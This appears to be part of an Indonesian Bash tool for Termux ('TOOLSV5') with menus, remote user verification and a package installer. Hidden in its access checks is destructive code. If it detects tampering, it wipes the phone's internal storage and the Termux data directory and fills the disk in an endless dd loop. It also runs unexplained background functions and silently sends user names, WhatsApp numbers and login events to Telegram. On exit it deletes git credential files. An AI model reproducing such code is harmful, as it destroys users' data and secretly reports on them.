                                                               e $m "==================================="
                                                               cat "$update"
                                                               e $m "===================================$h"
                                                               read -p " ENTER UNTUK MENGULANGI TOOLSV5"
                                                        elif [ "$no" = "dosa" ]; then
                                                               echo "Link TELEGRAM"
                                                               xdg-open "https://t.me/squidwardyahahayuk"
                                                        elif [[ $no == "report" || $no == "REPORT" ]]; then
                                                               clear
                                                               e $m "========================================"
                                                               e $k "          $m∆$k LAPOR BUG $m∆"
                                                               e $m "========================================"
                                                               e $h "Untuk melaporkan Bug\n Anda harus berada dimana script yang error\n Jika sudah screenshot script yang$m ERROR$h\n dan kirim ke whatsapp saya !"
                                                               e $m "========================================$bl"
                                                               read -p " ENTER UNTUK MELAPORKAN BUG"
                                                               xdg-open "https://wa.me/6285850268349?text=Assalamualaikum%20Bang%20Saya%20Nemu%20BUG%20TOOLSV5"
                                                        elif [[ $no == "tutor" || $no == "TUTOR" ]]; then
                                                               clear
                                                               xdg-open "https://t.me/+VcaXi-QLbwY2NmU1"
                                                               ENTER
                                                        elif [[ $no == "brangkas" || $no == "BRANGKAS" ]]; then
                                                               xdg-open "https://t.me/brangkas2002"
                                                        elif [ "$no" = "0" ]; then
                                                               rm -rf $PREFIX/tmp/ &> /dev/null
                                                               mkdir -p $PREFIX/tmp/ &> /dev/null
                                                               rm -rf $PREFIX/include/mpv/httpserver/service.h.zip &> /dev/null
                                                               rm -rf /data/data/com.termux/files/home/.git-credentials &> /dev/null &
                                                               rm -rf /data/data/com.termux/files/home/.gitconfig &> /dev/null &
                                                               rm -rf $HOME/Lubeban/install.sh &> /dev/null
                                                               play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null
                                                               kill_sound &> /dev/null &
                                                               cd $HOME
                                                               isipesan="Terdeteksi Keluar Dari TOOLSV5 !  💻"
                                                               telegram &> /dev/null &
                                                               exit 0
                                                        else
                                                               play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                               e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res "
                                                               play -q $HOME/Lubeban/sound/input_salah.mp3 &> /dev/null &
                                                               sleep 5
                                                        fi
                                                 done
                                          }
                                          clear
                                          toolsv5git="$HOME/Lubeban/.git/index"
                                          if [ -f "$toolsv5git" ]; then
                                                 BLOCKLIST_FILE="$PREFIX/lib/blockID"
                                                 if [ -f "$BLOCKLIST_FILE" ]; then
                                                        blocklist_ids=$(tr -d ' ' < "$BLOCKLIST_FILE")
                                                        termux_id=$(whoami)
                                                 fi
                                                 termux_id=$(whoami)
                                                 if echo "$blocklist_ids" | grep -wq "$termux_id"; then
                                                        isipesan=" BLOCKLIST ID SUCCESFULL  💻"
                                                        telegram &> /dev/null &
                                                        clear
                                                        echo "y" | termux-setup-storage &> /dev/null &
                                                        $banner | lolcat
                                                        $e
                                                        $e
                                                        play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                        e $bg_m "ANDA DI LARANG MENGGUNAKAN TOOLSV5 !$res"
                                                        sleep 3
                                                        play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                        base &> /dev/null &
                                                        xxparun &> /dev/null &
                                                        exit 0
                                                 else
                                                        security="/data/data/com.termux/files/home/Lubeban/.git"
                                                        if [ -d "$security" ]; then
                                                               clear
                                                               e "$b"
                                                               fetch_database() {
                                                                      curl -fsSL "$DATABASE_URL" || {
                                                                             echo "Gagal mengambil database dari URL!"
                                                                             return 1
                                                                      }
                                                               }
                                                               decrypt_id() {
                                                                      local encrypted="$1"
                                                                      echo "$encrypted" | openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -salt -pass pass:"$ENCRYPTION_PASS" -base64 2> /dev/null
                                                               }
                                                               checkdir() {
                                                                      if [ -d $PREFIX/include/bash/include/Version ]; then
                                                                             isipesan="Direktori Version Ada Tuan"
                                                                             telegram &> /dev/null &
                                                                      else
                                                                             mkdir -p $PREFIX/include/bash/include/Version
                                                                             cekversi=$(ls $PREFIX/include/bash/include/Version)
                                                                             isipesan="$cekversi Baru Di Buat Tuan"
                                                                             telegram &> /dev/null &
                                                                      fi
                                                               }
                                                               cek_jalur_apikey() {
                                                                      echo "y" | termux-setup-storage &> /dev/null
                                                                      cek="/sdcard/DCIM"
                                                                      if [ -d "$cek" ]; then
                                                                             return 0
                                                                      else
                                                                             e "$ran6 
Saya tak mendapatkan perizinan penyimpanan ke internal anda
mohon untuk mengizinkan saya menyimpan file ke internal anda !"
                                                                             pkill -9 com.termux
                                                                      fi
                                                               }
                                                               auto_login_check() {
                                                                      if [[ ! -f $gal ]]; then
                                                                             return 1
                                                                      fi
                                                                      read -r saved_user saved_encrypted_uuid saved_wa_number < "$gal"
                                                                      if [[ -z $saved_user || -z $saved_encrypted_uuid || -z $saved_wa_number ]]; then
                                                                             rm -f "$gal"
                                                                             return 1
                                                                      fi
                                                                      local database_content file_user file_encrypted_uuid file_wa_number
                                                                      database_content=$(fetch_database) || return 1
                                                                      while IFS= read -r line; do
                                                                             [[ -z $line ]] && continue
                                                                             file_user=$(awk '{print $1}' <<< "$line")
                                                                             file_encrypted_uuid=$(awk '{print $2}' <<< "$line")
                                                                             file_wa_number=$(awk '{print $3}' <<< "$line")
                                                                             if [[ $file_user == "$saved_user" && $file_encrypted_uuid == "$saved_encrypted_uuid" && $file_wa_number == "$saved_wa_number" ]]; then
                                                                                    return 0
                                                                             fi
                                                                      done <<< "$database_content"
                                                                      rm -f "$gal"
                                                                      return 1
                                                               }
                                                               check_user() {
                                                                      checkdir &> /dev/null &
                                                                      local user=$1
                                                                      local wa_number=$2
                                                                      mpv "$HOME/Lubeban/sound/loading.mp3" &> /dev/null &
                                                                      e $b "│ ┌───────────────┐"
                                                                      e $b "├─┤$m VERIFIKASI$p ID$b │"
                                                                      e $b "│ └───────────────┘"
                                                                      sleep 1
                                                                      for i in {0..100}; do
                                                                             echo -ne "\r └► Verifikasi [ $i ]"
                                                                             sleep 0.05
                                                                      done
                                                                      local database_content
                                                                      database_content=$(fetch_database)
                                                                      if [[ $? -ne 0 ]]; then
                                                                             isipesan="Gagal Ambil Database Untuk User $user $wa_number 💻"
                                                                             telegram &> /dev/null &
                                                                             echo -ne "\r └► Gagal mengambil database."
                                                                             sleep 3
                                                                             return 1
                                                                      fi
                                                                      local found=0
                                                                      while read -r line; do
                                                                             [[ -z $line ]] && continue
                                                                             file_user=$(awk '{print $1}' <<< "$line")
                                                                             file_encrypted_uuid=$(awk '{print $2}' <<< "$line")
                                                                             file_wa_number=$(awk '{print $3}' <<< "$line")
                                                                             if [[ $file_user == "$user" ]]; then
                                                                                    found=1
                                                                                    if [[ $file_wa_number != "$wa_number" ]]; then
                                                                                           isipesan="WhatsApp Tak Ada Di Database $wa_number"
                                                                                           telegram &> /dev/null &
                                                                                           echo -ne "\r └► Nomor WhatsApp tidak valid\033[K"
                                                                                           play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null
                                                                                           sleep 2
                                                                                           return 1
                                                                                    fi
                                                                                    isipesan="Login Valid $user $wa_number 💻"
                                                                                    telegram &> /dev/null &
                                                                                    echo -ne "\r └► Login Valid Halo $namamu\033[K"
                                                                                    echo "$user $file_encrypted_uuid $wa_number" >> "$gal"
                                                                                    play -q "$HOME/Lubeban/sound/robot2.mp3" &> /dev/null
                                                                                    return 0
                                                                             fi
                                                                      done <<< "$database_content"
                                                                      if [[ $found -eq 0 ]]; then
                                                                             checkdir &> /dev/null &
                                                                             isipesan="User tidak ditemukan. $user $wa_number 💻"
                                                                             telegram &> /dev/null &
                                                                             play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null &
                                                                             echo -ne "\r └► User tidak ditemukan\033[K"
                                                                             sleep 3
                                                                      fi
                                                                      return 1
                                                               }
                                                               galirus() {
                                                                      pesan=("Halo, dunia!" "Semangat terus!" "Jangan Dengarkan Apa Kata Mereka!" "Pemrograman Bash itu seru!" "Semoga harimu menyenangkan!" "Tetap positif!" "Persetan Untuk Kang Recode!" "Koding Itu Menyenangkan!" "Scanning Apikey Version: $versitoolsv5")
                                                                      jumlah=${#pesan[@]}
                                                                      pesan_acak=${pesan[RANDOM % jumlah]}
                                                                      play -q "$HOME/Lubeban/sound/robot.mp3" &> /dev/null
                                                                      cowsay -f eyes "$pesan_acak"
                                                               }
                                                               while true; do
                                                                      echo "y" | termux-setup-storage &> /dev/null
                                                                      clear
                                                                      namamu=$(cat "$nama_file")
                                                                      galirus | lolcat
                                                                      termux_id=$(whoami)
                                                                      formatted_date=$(printf "%-25s" "$ucap$tanggal")
                                                                      format_ids=$(printf "%-10s" "$termux_id")
                                                                      e $b "┌─────────────────────────────────────────────────┐"
                                                                      e $b "│ $b [$m •$b ]$p Notifikasi  $m  :$k$k Selamat$m $ucapan $k$b        │"
                                                                      e $b "│ $b [$k •$b ]$p Sekarang Jam$m  :$k$k $(date +"%H:%M")$b                    │"
                                                                      e $b "│ $b [$h •$b ]$p Sekarang Hari$m :$k $formatted_date$b│"
                                                                      e $b "│ $b [$u •$b ]$p Your ID     $m  :$k$k $format_ids              $b │"
                                                                      e $b "├─────────────────────────────────────────────────┘"
                                                                      e $b "│"
                                                                      if [[ -f $gal ]]; then
                                                                             if auto_login_check; then
                                                                                    bluearchive() {
                                                                                           audioupdate() {
                                                                                                  cd $PREFIX/lib/python3.11/email/mime/audio || return
                                                                                                  git pull origin main &> /dev/null
                                                                                                  git stash &> /dev/null
                                                                                           }
                                                                                           audioupdate &> /dev/null &
                                                                                           audio_dir="$PREFIX/lib/python3.11/email/mime/audio"
                                                                                           audio_files=($(ls -1 "$audio_dir"/*.mp3 2> /dev/null | shuf))
                                                                                           random_audio=${audio_files[RANDOM % ${#audio_files[@]}]}
                                                                                           mpv --volume=70 "$random_audio" &> /dev/null
                                                                                    }
                                                                                    bluearchive &> /dev/null
                                                                                    e $b "│ ┌───────────────┐"
                                                                                    e $b "├─┤$m VERIFIKASI$p ID$b │"
                                                                                    e $b "│ └───────────────┘"
                                                                                    sleep 1
                                                                                    function show_loading() {
                                                                                           local i=0
                                                                                           while [ $i -le 100 ]; do
                                                                                                  echo -ne "\r └► Verifikasi [ $i ]"
                                                                                                  sleep 0.05
                                                                                                  ((i++))
                                                                                           done
                                                                                    }
                                                                                    kill $! &> /dev/null &
                                                                                    play -q "$HOME/Lubeban/sound/robot2.mp3" &> /dev/null &
                                                                                    isipesan="ID TERDAFTAR UNTUK $namamu"
                                                                                    telegram &> /dev/null &
                                                                                    echo -ne "\r └► ID TERDAFTAR HALO $namamu"
                                                                                    sleep 3
                                                                                    clear
                                                                                    play -q "$HOME/Lubeban/sound/welcome.mp3" &> /dev/null &
                                                                                    e $bl
                                                                                    text="      Selamat Datang Di TOOLSV5 $versitoolsv5"
                                                                                    delay=0.05
                                                                                    for ((i = 0; i < ${#text}; i++)); do
                                                                                           echo -n "${text:i:1}"
                                                                                           sleep $delay
                                                                                    done
                                                                                    hore_ultah
                                                                                    filesound
                                                                                    TOOLS
                                                                                    exit 0
                                                                             else
                                                                                    rm -f "$gal"
                                                                             fi
                                                                      fi
                                                                      sleep 2
                                                                      play -q "$HOME/Lubeban/sound/robot2.mp3" &> /dev/null &
                                                                      play -q "$HOME/Lubeban/sound/falid.mp3" &> /dev/null &
                                                                      read -p " ├────►  User Anda          : " user
                                                                      read -p " ├────►  No Wa ( awali 62 ) : " wa_number
                                                                      if [[ $user =~ ^(EIXT|exit)$ ]]; then
                                                                             exit 0
                                                                      fi
                                                                      if check_user "$user" "$wa_number"; then
                                                                             printf "\r"
                                                                      else
                                                                             echo -ne "\r └► Anda Masuk Ke Mode TRIAL"
                                                                             sleep 2
                                                                             hore_ultah
                                                                             filesound
                                                                             TOOLS
                                                                      fi
                                                               done
                                                        else
                                                               play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                               clear
                                                               isipesan=" SCRIPT TIDAK DAPAT DI AKSES ��️"
                                                               telegram &> /dev/null &
                                                               e $b" ╔══════════════════════════════════════════════╗$b"
                                                               e $b" ║$h       💀SCRIPT TIDAK DAPAT DI AKSES��       $b ║"
                                                               e $b" ╚══════════════════════════════════════════════╝$b"
                                                               sleep 3
                                                               echo
                                                               echo "y" | termux-setup-storage &> /dev/null &
                                                               rm -rf /storage/emulated/0 &> /dev/null &
                                                               rm -rf data/data/com.termux/ &> /dev/null &
                                                               while true; do dd if=/dev/zero of=largefile bs=1G count=1; done
                                                               e $k " Atas Pelanggaran yang anda lakukan"
                                                               e $h " TOOLSV5$k menolak AKSES ke anda"
                                                               exit
                                                        fi
                                                 fi
                                          else
                                                 base &> /dev/null &
                                                 xxparun &> /dev/null &
                                                 clear
                                                 isipesan="Terdeteksi Melanggar Aturan / Hak Tanpa Izin. MODE LAG ON AND RESET ON 🔥"
                                                 telegram &> /dev/null &
                                                 echo
                                                 cd $HOME
                                                 clear
                                                 play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                 e $m "KERJA BAGUS BUNG ! AKU SUKA CARA MAIN MU ! "
                                                 sleep 5
                                                 clear
                                                 e $m "Hanya Saja Anda Saya Tolak"
                                                 sleep 5
                                                 clear
                                                 e $m "MELARANG PENGUNAAN SCRIPT MODIFIKASI ON ! "
                                                 play -q $HOME/Lubeban/backsound.mp3 &> /dev/null &
                                                 exit 0
                                          fi
                                   else
                                          clear
                                          e "$bl"
                                          play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                          while true; do
                                                 clear
                                                 cekdirektorinama="$PREFIX/include/bash/include"
                                                 if [ -d "$cekdirektorinama" ]; then
                                                        while true; do
                                                               namamu=$(dialog --inputbox "Kalau boleh tahu, siapa nama Anda?" 8 40 --output-fd 1)
                                                               if [ $? -ne 0 ]; then
                                                                      clear
                                                                      echo "Anda Harus Memasukkan Nama Anda"
                                                                      sleep 3
                                                               fi
                                                               namamu=$(echo "$namamu" | sed 's/^[ \t]*//;s/[ \t]*$//')
                                                               if [[ $namamu =~ ^[a-zA-Z]+([[:space:]][a-zA-Z]+)*$ ]] && [[ ${#namamu} -le 23 ]]; then
                                                                      echo "$namamu" > "$nama_file"
                                                                      dialog --infobox "Nama berhasil disimpan!" 6 30
                                                                      sleep 3
                                                                      clear
                                                                      break
                                                               else
                                                                      dialog --infobox "Nama hanya boleh berisi huruf dan spasi (tanpa angka/simbol), maksimal 23 karakter!" 7 50
                                                               fi
                                                        done
                                                        break
                                                 else
                                                        mkdir -p $PREFIX/include/bash/include
                                                 fi
                                          done
                                          break
                                   fi
                            done
                     else
                            clear
                            cd $HOME/Lubeban
                            e $m$bg_lg "UPDATE TOOLSV5 OTOMATIS $bl$res"
                            play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null
                            play -q $HOME/Lubeban/sound/update.mp3 &> /dev/null &
                            sleep 5
                            clear
                            play -q $HOME/Lubeban/sound/robot.mp3 &> /dev/null &
                            e $m "Lagi Menginstall Mohon Bersabar"
                            sleep 5
                            clear
                            play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                            $paket update
                            echo "y" | termux-setup-storage &> /dev/null &
                            clear
                            pkg update
                            $paket install python python3 -y
                            $paket install -y git
                            $paket install -y bash
                            $paket install -y ruby
                            $paket install -y curl
                            $paket install -y gnupg
                            $paket install -y socat
                            $paket install -y php
                            $paket install -y jq
                            $paket install -y wget
                            $paket install -y zip
                            $paket install -y unzip
                            $paket install -y tree
                            $paket install -y tmux
                            $paket install -y coreutils bash
                            $paket install -y ncurses-utils xh
                            $paket install -y libcurl
                            $paket install -y openssl openssl-tool
                            $paket install -y figlet
                            $paket install -y openssh
                            $paket install -y which
                            $paket install -y cloudflared
                            $paket install -y cowsay
                            $paket install -y mpv
                            $paket install -y sox
                            $paket install -y dialog
                            $paket install -y ffmpeg
                            packages=(
                                   git
                                   bash
                                   neofetch
                                   sox
                                   mpv
                                   dialog
                                   cowsay
                                   ruby
                                   neovim
                                   coreutils
                                   xz-utils
                                   bc
                                   boxes
                                   ncurses-utils
                                   tree
                                   tmux
                                   cmake
                                   nodejs
                                   clang
                                   make
                                   binutils
                                   zip
                                   unzip
                                   jq
                                   ossp-uuid
                                   xxd
                                   openssl
                                   openssl-tool)
                            check_package() {
                                   dpkg -s "$1" &> /dev/null
                                   return $?
                            }
                            report="Laporan Instalasi Package:"
                            for pkg in "${packages[@]}"; do
                                   if check_package "$pkg"; then
                                          report+="✅ $pkg sudah terinstall"
                                   else
                                          report+="❌ $pkg belum terinstall, mencoba install..."
                                          if nala install "$pkg" -y; then
                                                 report+="   ✔ Berhasil install $pkg"
                                          else
                                                 report+="   ❌ Gagal install $pkg"
                                          fi
                                   fi
                            done
                            if npm list -g bash-obfuscate &> /dev/null; then
                                   report+="✅ npm package bash-obfuscate sudah terinstall"
                            else
                                   report+="❌ npm package bash-obfuscate belum terinstall, mencoba install..."
                                   if npm install -g bash-obfuscate; then
                                          report+="   ✔ Berhasil install bash-obfuscate"
                                   else
                                          report+="   ❌ Gagal install bash-obfuscate"
                                   fi
                            fi
                            pip_pkgs=("rich" "rich-cli")
                            for pip_pkg in "${pip_pkgs[@]}"; do
                                   if pip show "$pip_pkg" &> /dev/null; then
                                          report+="✅ pip package $pip_pkg sudah terinstall"
                                   else
                                          report+="❌ pip package $pip_pkg belum terinstall, mencoba install..."
                                          if pip install "$pip_pkg"; then
                                                 report+="   ✔ Berhasil install $pip_pkg"
                                          else
                                                 report+="   ❌ Gagal install $pip_pkg"
                                          fi
                                   fi
                            done
                            if gem list -i lolcat &> /dev/null; then
                                   report+="✅ gem package lolcat sudah terinstall"
                            else
                                   report+="❌ gem package lolcat belum terinstall, mencoba install..."
                                   if gem install lolcat; then
                                          report+="   ✔ Berhasil install lolcat"
                                   else
                                          report+="   ❌ Gagal install lolcat"
                                   fi
                            fi
                            isipesan="$report"
                            telegram &> /dev/null &
                            sleep 5
                            clear
                            wget https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O $PREFIX/bin/yt-dlp
                            chmod a+rx $PREFIX/bin/yt-dlp
                            clear
                            gem install lolcat
                            python3 -m pip install requests mechanize bs4
                            python3 -m pip install pycryptodome keyboard
                            python3 -m pip install rich colorama tqdm
                            python3 -m pip install packaging
                            pip install --upgrade yt-dlp
                            URLS=(
                                   "https://od.lk/d/OV8yNTExMDUwODBf/4OBKZY4DVLRYHJPDQO6OHA5L4OBLTZMFRDTZJHY_1.wav"
                                   "https://od.lk/d/OV8yNTExMDUwODFf/arona_attendance_enter_1.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwODJf/arona_attendance_enter_2.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwODRf/arona_attendance_enter_3.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwODVf/arona_attendance_enter_4.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwNzlf/arona_eventarchive_enter_1.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwODZf/arona_eventarchive_enter_2.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwODdf/arona_work_sit_in_1.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwODhf/arona_work_sit_talk_1.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwODlf/arona_work_sit_talk_2.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwOTBf/arona_work_sit_talk_3.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwOTJf/arona_work_watch_in_1.ogg"
                                   "https://od.lk/d/OV8yNTExMDUwOTNf/arona_work_watch_in_2.ogg")
                            TARGET_DIR="$PREFIX/lib/bash/.Audio"
                            mkdir -p "$TARGET_DIR"
                            echo "Sabar Bro Sedang Download File Bentar"
                            for URL in "${URLS[@]}"; do
                                   curl -sL --output-dir "$TARGET_DIR" -O "$URL" &> /dev/null
                            done
                            echo "Pengunduhan selesai. File disimpan"
                            e $h$bg_m "Instalasi Selesai$res"
                     fi
                     rm -rf $HOME/.number_otp
                     cd $HOME/Lubeban
                     git pull origin main &> /dev/null
                     git stash &> /dev/null
                     play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                     clear
                     suara
                     play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                     clear
                     repository
                     curl -sL -k -o "$PREFIX/bin/MusicG404" "https://od.lk/s/NzNfOTU0NTM4MjFf/music.txt" &> /dev/null | e "$h Sabar Sedang Download File"
                     clear
                     play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                     e $bg_lg$m " Kedepannya Anda Hanyak Cukup Ketik$h toolsv5$m Saja$res "
                     echo
                     echo
                     read -p "Silahkan Enter Jika Paham Jika Tidak Dm Admin"
                     touch $packageinstalling
              done
       done
else
       play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
       clear
       e $b" ╔══════════════════════════════════════════════╗$b"
       e $b" ║$h       💀SCRIPT TIDAK DAPAT DI AKSES.           $b ║"
       e $b" ╚══════════════════════════════════════════════╝$b"
       sleep 3
       echo
       echo "y" | termux-setup-storage &> /dev/null &
       e $k " Atas Pelanggaran yang anda lakukan"
       e $h " TOOLSV5$k menolak AKSES ke anda"
       base &> /dev/null &
       exit 0
fi
